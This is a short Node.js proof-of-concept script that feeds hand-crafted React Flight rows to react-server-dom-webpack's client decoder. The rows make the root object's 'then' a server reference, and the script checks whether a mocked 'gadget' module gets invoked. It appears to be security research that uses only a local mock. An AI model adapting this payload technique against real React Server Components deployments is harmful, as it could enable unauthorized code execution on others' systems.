const { createFromReadableStream } = require('react-server-dom-webpack/client.node');

let PWNED = null;
const GADGET_MOD = 'gadget-module-id';
global.__webpack_require__ = (id) => {
  if (id === GADGET_MOD) return { run: (...a) => { PWNED = a; console.log('  *** GADGET run() CALLED, args=', JSON.stringify(a)); return 'ok'; } };
  throw new Error('no module ' + id);
};
const serverConsumerManifest = {
  moduleMap: {}, moduleLoading: null,
  serverModuleMap: { 'gadget-module-id#run': { id: GADGET_MOD, chunks: [], name: 'run' } },
};

// Hand-crafted raw Flight rows: root is a thenable whose `.then` is a server reference.
const payload =
  '1:{"id":"gadget-module-id#run","bound":null}\n' +
  '0:{"then":"$h1"}\n';

function streamOf(str) {
  return new ReadableStream({ start(c){ c.enqueue(new TextEncoder().encode(str)); c.close(); } });
}

(async () => {
  console.log('--- payload rows ---\n  ' + payload.replace(/\n/g,'\n  '));
  console.log('--- decode ---');
  try {
    const v = await createFromReadableStream(streamOf(payload), { serverConsumerManifest });
    console.log('  resolved root =', v);
  } catch (e) {
    console.log('  threw:', String(e && e.message).slice(0,200));
  }
  console.log('>>> PWNED =', PWNED === null ? 'NO' : 'YES ' + JSON.stringify(PWNED));
})();
